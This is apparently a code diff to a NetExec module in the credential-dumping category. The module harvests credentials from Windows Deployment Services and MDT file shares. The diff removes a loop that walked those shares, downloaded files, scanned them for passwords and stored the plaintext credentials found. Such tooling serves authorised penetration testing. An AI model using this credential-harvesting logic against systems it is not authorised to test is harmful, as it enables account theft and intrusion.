@@ -150,7 +150,7 @@ class NXCModule:
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
-        """DOWNLOAD  Download all found files (INI/XML + WinPE .wim < 1 GB)  (default: false)"""
+        """DOWNLOAD     Download all found files (INI/XML + WinPE .wim < 1 GB)  (default: false)"""
         self.download = module_options.get("DOWNLOAD", "false").lower() == "true"
         self.output_path = join(NXC_PATH, "modules", "wds_mdt")
 
@@ -165,56 +165,6 @@ class NXCModule:
                 self.explore_wds(name)
             elif name in {"deploymentshare$"}:
                 self.explore_mdt(name)
-
-        for wds_share in ["REMINST", "REMOTEINSTALL", "DeploymentShare$"]:
-            is_privileged = wds_share.lower() in {"deploymentshare$"}
-            access_note = "admin access or misconfigured ACLs" if is_privileged else "standard user access"
-            context.log.success(f"Found share: {wds_share} ({access_note})")
-
-            try:
-                paths = _walk_share(connection, wds_share)
-            except Exception as e:
-                context.log.debug(f"walk({wds_share}) failed: {e}")
-                continue
-
-            for path, file_size in paths:
-                context.log.debug(f"Found {path}")
-
-                buf = BytesIO()
-                try:
-                    connection.conn.getFile(wds_share, "\\" + path, buf.write)
-                except Exception as e:
-                    context.log.debug(f"getFile({path}) failed: {e}")
-                    continue
-
-                hits = _cred_scan(_decode(buf.getvalue()))
-
-                if hits:
-                    context.log.success(f"Credentials found in {path}")
-                    for hit in hits:
-                        context.log.highlight(f"  {hit}")
-
-                    # Push reconstructed credential pairs into the NXC database
-                    for cred in _parse_creds(hits):
-                        try:
-                            context.db.add_credential(
-                                "plaintext",
-                                cred["domain"],
-                                cred["username"],
-                                cred["password"],
-                            )
-                            context.log.debug(
-                                f"Credential added to db: {cred['domain']}\\{cred['username']}"
-                            )
-                        except Exception as e:
-                            context.log.debug(f"db.add_credential failed: {e}")
-                else:
-                    context.log.debug(f"No credentials found in {path}")
-
-                if self.download:
-                    local = _download(context, connection, wds_share, "\\" + path, self.outdir)
-                    if local:
-                        context.log.success(f"Saved: {local}")
 
     def explore_wds(self, share):
         """
